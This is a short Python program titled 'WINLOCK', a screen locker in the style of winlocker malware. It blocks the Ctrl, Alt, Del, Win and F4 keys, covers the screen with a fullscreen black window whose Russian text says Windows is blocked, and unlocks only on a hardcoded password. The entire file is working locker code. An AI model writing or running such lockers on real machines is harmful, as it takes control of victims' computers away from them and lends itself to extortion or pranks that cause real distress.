import tkinter
import os
import keyboard


keyboard.block_key("F4")
keyboard.block_key("CTRL")
keyboard.block_key("ALT")
keyboard.block_key("DEL")
keyboard.block_key("WIN")

password = "90765"

def block():
    screen.attributes('-fullscreen', True)
    screen.mainloop()
    keyboard.press("F11")

def unblock():
    text = format(field.get())

    if text == password:
        screen.quit()
screen=tkinter.Tk()
screen.title("WINLOCK")
screen.config(background="black")

txt=tkinter.Label(screen, text="Windows заблокирован!", fg="red", font="TimesNewRoman 50", bg="black")
txt2=tkinter.Label(screen, text="Введи пароль чтоб разблокировать систему.", fg="red", font="TimesNewRoman 35", bg="black")

field=tkinter.Entry(screen, fg="red", bg="black", font="TimesNewRoman 30", justify="center")

unblockbut=tkinter.Button(screen, fg="red", bg="black", font="TimesNewRoman 30", command=unblock, text="Разблокировать")

txt.pack()
txt2.pack()
field.pack()

unblockbut.pack()
block()